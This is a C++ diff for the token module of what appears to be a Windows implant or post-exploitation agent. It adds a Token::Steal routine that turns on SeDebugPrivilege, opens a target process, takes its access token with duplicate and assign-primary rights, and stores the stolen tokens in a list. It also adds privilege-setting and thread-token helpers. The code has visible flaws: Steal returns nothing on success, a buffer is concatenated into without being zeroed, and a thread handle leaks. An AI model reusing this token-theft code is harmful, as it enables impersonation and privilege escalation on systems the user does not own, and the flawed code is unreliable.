@@ -2,21 +2,29 @@
 
 using namespace Root;
 
+auto DECLFN Token::Current( VOID ) -> HANDLE {
+    HANDLE ProcHandle   = INVALID_HANDLE_VALUE;
+    HANDLE ThreadHandle = INVALID_HANDLE_VALUE;
+    
+    Self->Tkn->TdOpen( NtCurrentThread(), TOKEN_QUERY, FALSE, &ThreadHandle );
+    Self->Tkn->ProcOpen( NtCurrentProcess(), TOKEN_QUERY, &ProcHandle );
+
+    return ProcHandle;
+}
+
 auto DECLFN Token::GetUser(
-    _Out_ PCHAR *UserNamePtr,
-    _Out_ ULONG *UserNameLen,
     _In_  HANDLE TokenHandle
-) -> BOOL {
-    PTOKEN_USER  TokenUserPtr = NULL;
+) -> CHAR* {
+    TOKEN_USER*  TokenUserPtr = nullptr;
     SID_NAME_USE SidName      = SidTypeUnknown;
     NTSTATUS     NtStatus     = STATUS_SUCCESS;
-    ULONG        TotalLen     = 0;
-    ULONG        ReturnLen    = 0;
-    PSTR         DomainStr    = NULL;
-    ULONG        DomainLen    = 0;
-    PSTR         UserStr      = NULL;
-    ULONG        UserLen      = 0;
-    BOOL         bSuccess     = FALSE;
+
+    CHAR* UserDom   = nullptr;
+    ULONG TotalLen  = 0;
+    ULONG ReturnLen = 0;
+    ULONG DomainLen = 0;
+    ULONG UserLen   = 0;
+    BOOL  Success   = FALSE;
 
     NtStatus = Self->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, NULL, 0, &ReturnLen );
     if ( NtStatus != STATUS_BUFFER_TOO_SMALL ) {
@@ -31,45 +39,120 @@ auto DECLFN Token::GetUser(
     NtStatus = Self->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, TokenUserPtr, ReturnLen, &ReturnLen );
     if ( !NT_SUCCESS( NtStatus ) ) { goto _KH_END; }
 
-    bSuccess = Self->Advapi32.LookupAccountSidA(
+    Success = Self->Advapi32.LookupAccountSidA(
         NULL, TokenUserPtr->User.Sid, NULL,
         &UserLen, NULL, &DomainLen, &SidName
     );
 
-    if ( !bSuccess && KhGetError == ERROR_INSUFFICIENT_BUFFER ) {
+    if ( !Success && KhGetError == ERROR_INSUFFICIENT_BUFFER ) {
         TotalLen = UserLen + DomainLen + 2;
 
-        *UserNamePtr = ( PCHAR )Self->Hp->Alloc( TotalLen );
-        if ( !*UserNamePtr ) { goto _KH_END; }
+        UserDom = (CHAR*)Self->Hp->Alloc( TotalLen );
+        if ( !UserDom ) { goto _KH_END; }
 
-        DomainStr = *UserNamePtr;
-        UserStr   = (*UserNamePtr) + DomainLen;
+        CHAR  Domain[DomainLen];
+        CHAR  User[UserLen];
 
-        bSuccess = Self->Advapi32.LookupAccountSidA(
-            NULL, TokenUserPtr->User.Sid, UserStr,
-            &UserLen, DomainStr, &DomainLen, &SidName
+        Success = Self->Advapi32.LookupAccountSidA(
+            NULL, TokenUserPtr->User.Sid, User,
+            &UserLen, Domain, &DomainLen, &SidName
         );
-
-        if ( bSuccess ) {
-            (*UserNamePtr)[DomainLen] = '\\';
-        } else {
-            Self->Hp->Free( *UserNamePtr );
-            *UserNamePtr = NULL;
-            *UserNameLen = 0;
-        }
+        if ( !Success ) goto _KH_END;
+        
+        Str::ConcatA( UserDom, Domain );
+        Str::ConcatA( UserDom, "\\" );
+        Str::ConcatA( UserDom, User );
     }
 
 _KH_END:
     if ( TokenUserPtr ) {
         Self->Hp->Free( TokenUserPtr );
     }
-    return bSuccess;
+
+    if ( !Success ) {
+        Self->Hp->Free( UserDom );
+        UserDom = nullptr;
+    }
+    
+    return UserDom;
+}
+
+auto DECLFN Token::Steal(
+    _In_ ULONG ProcessID
+) -> HANDLE {
+    HANDLE TokenHandle   = INVALID_HANDLE_VALUE;
+    HANDLE ProcessHandle = INVALID_HANDLE_VALUE;
+
+    LONG TokenFlags = TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_DUPLICATE;
+
+    TokenHandle = this->Current();
+
+    this->SetPriv( TokenHandle, "SeDebugPrivilege" );
+
+    Self->Ntdll.NtClose( TokenHandle );
+
+    ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION, TRUE, ProcessID );
+    if ( ProcessHandle == INVALID_HANDLE_VALUE || !ProcessHandle ) return ProcessHandle;
+
+    Self->Tkn->ProcOpen( ProcessHandle, TokenFlags, &TokenHandle );
+    if ( TokenHandle == INVALID_HANDLE_VALUE || !TokenHandle ) return TokenHandle;
+
+    TOKEN_NODE* NewNode = (TOKEN_NODE*)Self->Hp->Alloc( sizeof( TOKEN_NODE ) );
+
+    NewNode->Handle    = TokenHandle;
+    NewNode->Host      = Self->Machine.CompName;
+    NewNode->ProcessID = ProcessID;
+    NewNode->User      = this->GetUser( TokenHandle );
+    NewNode->TokenID   = Rnd32() % 9999;
+
+    if ( !this->Node ) {
+        this->Node = NewNode;
+    } else {
+        TOKEN_NODE* Current = this->Node;
+
+        while ( Current->Next ) {
+            Current = Current->Next;
+        }
+        Current->Next = NewNode;
+    }
+
+    if ( ProcessHandle ) Self->Ntdll.NtClose( ProcessHandle );
+}
+
+auto DECLFN Token::SetPriv(
+    _In_ HANDLE Handle,
+    _In_ CHAR*  PrivName
+) -> BOOL {
+    LUID Luid = { 0 };
+
+    TOKEN_PRIVILEGES Privs = { 0 };
+
+    BOOL Success = FALSE;
+
+    Success = Self->Advapi32.LookupPrivilegeValueA( nullptr, PrivName, &Luid );
+    if ( !Success ) return Success;
+
+    Privs.PrivilegeCount           = 1;
+    Privs.Privileges[0].Luid       = Luid;
+    Privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    Success = Self->Advapi32.AdjustTokenPrivileges( Handle, FALSE, &Privs, sizeof( TOKEN_PRIVILEGES ), nullptr, 0 );
+    return Success;
+}
+
+auto DECLFN Token::TdOpen(
+    _In_  HANDLE  ThreadHandle,
+    _In_  ULONG   RightsAccess,
+    _In_  BOOL    OpenAsSelf,
+    _Out_ HANDLE* TokenHandle
+) -> BOOL {
+    return Self->Advapi32.OpenThreadToken( ThreadHandle, RightsAccess, OpenAsSelf, TokenHandle );
 }
 
 auto DECLFN Token::ProcOpen(
-    _In_ HANDLE  ProcessHandle,
-    _In_ ULONG   RightsAccess,
-    _In_ PHANDLE TokenHandle
+    _In_  HANDLE  ProcessHandle,
+    _In_  ULONG   RightsAccess,
+    _Out_ HANDLE* TokenHandle
 ) -> BOOL {
     return Self->Advapi32.OpenProcessToken( ProcessHandle, RightsAccess, TokenHandle );
 }
